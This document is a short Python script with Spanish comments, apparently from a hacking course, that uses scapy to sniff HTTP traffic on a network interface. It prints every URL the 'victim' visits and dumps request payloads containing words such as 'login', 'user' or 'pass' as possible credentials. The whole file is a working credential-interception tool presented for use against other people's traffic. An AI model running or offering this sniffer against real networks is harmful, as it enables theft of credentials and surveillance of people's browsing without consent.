#!/usr/bin/env python3 

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

# Definir el manejador de señales para manejar la interrupción por Ctrl+C
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...", 'red'))
    sys.exit(1)

# Registrar el manejador de señales para SIGINT (interrupción por Ctrl+C)
signal.signal(signal.SIGINT, def_handler) 

# Función para procesar cada paquete capturado
def process_packet(packet):
    
    # Palabras clave para buscar en el contenido del paquete que pueda indicar credenciales
    cred_keywords = ["login", "user", "pass", "mail"]

    # Verificar si el paquete contiene una solicitud HTTP
    if packet.haslayer(http.HTTPRequest):
        
        # Construir y mostrar la URL completa visitada
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))

        # Buscar en el paquete contenido que pueda ser una respuesta HTTP con datos sensibles
        if packet.haslayer(scapy.Raw):
            try:
                # Intentar decodificar el contenido de la respuesta HTTP
                response = packet[scapy.Raw].load.decode()
                
                # Buscar palabras clave dentro de la respuesta que puedan indicar credenciales
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
                        break
            except:
                pass

# Función para iniciar la captura de paquetes en una interfaz específica
def sniff(interface):
    # Iniciar la captura especificando la interfaz, la función de callback para procesar cada paquete y no almacenar los paquetes en memoria
    scapy.sniff(iface=interface, prn=process_packet, store=0)

# Función principal que define el flujo de ejecución del script
def main():
    # Iniciar la captura de paquetes en la interfaz "ens33"
    sniff("ens33")

if __name__ == '__main__':
    main()
